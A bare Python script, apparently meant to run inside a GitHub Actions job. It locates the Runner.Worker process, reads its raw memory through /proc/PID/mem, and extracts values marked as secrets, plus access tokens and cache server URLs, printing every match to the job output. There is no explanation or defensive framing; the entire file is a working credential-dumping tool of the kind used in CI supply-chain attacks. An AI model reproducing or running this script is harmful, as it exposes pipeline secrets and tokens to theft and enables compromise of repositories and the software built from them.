import sys
import os
import re
def get_pid():
    for pid in (p for p in os.listdir('/proc') if p.isdigit()):
        try:
            with open(os.path.join('/proc', pid, 'cmdline'), 'rb') as f:
                if b'Runner.Worker' in f.read():
                    return pid
        except Exception as e:
            continue
    raise SystemExit(0)
pid = get_pid()
map_path = f"/proc/{pid}/maps"
mem_path = f"/proc/{pid}/mem"
with open(map_path, 'r') as map_f, open(mem_path, 'rb', 0) as mem_f:
    for line in map_f:
        m = re.match(r'([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])', line)
        if not m or m.group(3) != 'r':
            continue
        start = int(m.group(1), 16)
        end   = int(m.group(2), 16)
        if start > sys.maxsize:
            continue
        mem_f.seek(start)
        try:
            chunk = mem_f.read(end - start)
            #sys.stdout.buffer.write(chunk)
            text = chunk.replace(b'\0', b'').decode('utf-8', errors='ignore')
            #print(text)
           # pattern = r'"[^"]+":\{"value":"[^"]*","isSecret":true\}'
            pattern = r'"[^"]+":\{"value":"[^"]*","isSecret":true\}|CacheServerUrl":"[^"]*"|AccessToken":"[^"]*"'
            matches = re.findall(pattern, text)
            for m in matches:
                print(line+m)
        except Exception as e:
            continue